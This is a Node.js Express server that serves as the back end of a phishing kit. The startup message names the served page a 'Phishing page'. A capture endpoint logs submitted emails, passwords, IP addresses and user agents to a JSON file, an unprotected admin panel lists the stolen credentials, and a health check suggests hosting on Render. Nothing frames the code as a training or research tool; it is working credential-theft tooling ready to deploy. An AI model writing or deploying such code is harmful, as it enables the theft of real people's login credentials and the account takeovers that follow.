const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.json({ limit: '10mb' }));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cors());
app.use(express.static('public'));

// Ensure captures file exists
const CAPTURES_FILE = './captures.json';
if (!fs.existsSync(CAPTURES_FILE)) {
    fs.writeFileSync(CAPTURES_FILE, '[]');
}

// Capture endpoint - receives credentials from frontend
app.post('/api/capture', (req, res) => {
    const data = {
        timestamp: new Date().toISOString(),
        ip: req.headers['x-forwarded-for'] || req.ip,
        userAgent: req.headers['user-agent'],
        ...req.body
    };
    
    // Log to console
    console.log('\n[CAPTURED]', JSON.stringify(data, null, 2));
    
    // Save to file
    const captures = JSON.parse(fs.readFileSync(CAPTURES_FILE));
    captures.push(data);
    fs.writeFileSync(CAPTURES_FILE, JSON.stringify(captures, null, 2));
    
    res.json({ status: 'ok' });
});

// Admin panel - view captured credentials
app.get('/admin', (req, res) => {
    const captures = JSON.parse(fs.readFileSync(CAPTURES_FILE));
    const html = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>Admin Panel</title>
        <style>
            body { font-family: monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
            .entry { border: 1px solid #333; margin: 10px 0; padding: 10px; background: #222; }
            .timestamp { color: #888; font-size: 12px; }
            .credentials { color: #ff6600; font-size: 16px; margin: 5px 0; }
            pre { white-space: pre-wrap; word-wrap: break-word; }
        </style>
    </head>
    <body>
        <h1>Captured Sessions (${captures.length})</h1>
        <button onclick="fetch('/api/clear', {method: 'POST'}).then(()=>location.reload())">Clear All</button>
        <hr>
        ${captures.reverse().map(c => `
            <div class="entry">
                <div class="timestamp">${c.timestamp} | IP: ${c.ip}</div>
                <div class="credentials">
                    ${c.email ? `Email: ${c.email}<br>` : ''}
                    ${c.password ? `Pass: ${c.password}<br>` : ''}
                </div>
                <pre>${JSON.stringify(c, null, 2)}</pre>
            </div>
        `).join('')}
    </body>
    </html>`;
    res.send(html);
});

// Clear captures
app.post('/api/clear', (req, res) => {
    fs.writeFileSync(CAPTURES_FILE, '[]');
    res.json({ cleared: true });
});

// Health check for Render
app.get('/health', (req, res) => {
    res.json({ status: 'alive', captures: JSON.parse(fs.readFileSync(CAPTURES_FILE)).length });
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`Phishing page: http://localhost:${PORT}`);
    console.log(`Admin panel: http://localhost:${PORT}/admin`);
});
